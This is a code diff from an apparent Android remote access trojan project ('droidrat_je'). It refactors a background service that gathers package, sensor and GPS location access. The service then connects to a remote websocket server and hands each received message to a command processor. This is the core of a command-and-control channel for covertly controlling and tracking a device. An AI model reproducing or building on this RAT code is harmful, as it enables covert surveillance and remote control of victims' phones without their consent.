@@ -14,15 +14,15 @@ import android.util.Log;
 
 import androidx.annotation.Nullable;
 
-import com.je_chen.droidrat_je.command.process_super.CommandProcess;
+import com.je_chen.droidrat_je.rat.command.process_super.CommandProcess;
 import com.je_chen.droidrat_je.service.receiver.ServiceLive;
-import com.je_chen.droidrat_je.socket.websocket.Websocket;
+import com.je_chen.droidrat_je.util.socket.websocket.Websockets;
 
 import java.net.URI;
 
 public class ProcessCommandService extends Service {
 
-    public static Websocket websocket;
+    public static Websockets websockets;
     final String TAG = "ProcessCommandService ";
     PackageManager packageManager;
 
@@ -76,17 +76,15 @@ public class ProcessCommandService extends Service {
             commandProcess = new CommandProcess(getApplicationContext(), packageManager, sensorManager, locationManager, "gps", 5000, 5);
 
             URI uri = URI.create(serverURI);
-            if (Websocket.instance() == null) {
-                websocket = new Websocket(uri, packageManager, this) {
-                    @Override
-                    public void onMessage(String message) {
-                        Log.v(TAG, "Receiver : " + message);
-                        commandProcess.processString(message);
-                    }
-                };
-            }
-            if (!websocket.isOpen())
-                websocket.connect();
+            websockets = new Websockets(uri, packageManager, this) {
+                @Override
+                public void onMessage(String message) {
+                    Log.v(TAG, "Receiver : " + message);
+                    commandProcess.processString(message);
+                }
+            };
+            if (!websockets.isOpen())
+                websockets.connect();
         } catch (Exception e) {
             e.printStackTrace();
         }
